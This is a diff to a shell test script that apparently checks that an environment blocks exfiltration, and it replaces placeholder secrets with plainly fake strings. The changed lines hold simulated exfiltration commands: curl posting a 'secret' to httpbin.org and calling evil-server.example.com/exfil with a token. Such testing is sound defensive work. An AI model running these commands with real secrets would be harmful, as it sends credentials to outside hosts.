@@ -158,7 +158,7 @@ echo -e "\n${BOLD}--- 4. Exfiltration Technique Blocking ---${NC}"
 
 # POST data to blocked domain (simulates secret exfiltration)
 POST_CODE=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 10 --max-time 15 \
-    -X POST -d "secret=AKIAIOSFODNN7EXAMPLE" "https://httpbin.org/post" 2>/dev/null)
+    -X POST -d "secret=FAKE_NOT_A_REAL_KEY_FOR_TESTING" "https://httpbin.org/post" 2>/dev/null)
 if [[ "$POST_CODE" =~ ^(000|403|407|503)$ ]]; then
     pass "BLOCK POST exfiltration to httpbin.org → HTTP $POST_CODE"
 else
@@ -176,7 +176,7 @@ fi
 
 # Try to reach an attacker-controlled webhook
 EXFIL_CODE=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 10 --max-time 15 \
-    "https://evil-server.example.com/exfil?token=ghp_1234567890" 2>/dev/null)
+    "https://evil-server.example.com/exfil?token=not_a_real_token_1234" 2>/dev/null)
 if [[ "$EXFIL_CODE" =~ ^(000|403|407|503)$ ]]; then
     pass "BLOCK attacker webhook (evil-server.example.com)"
 else
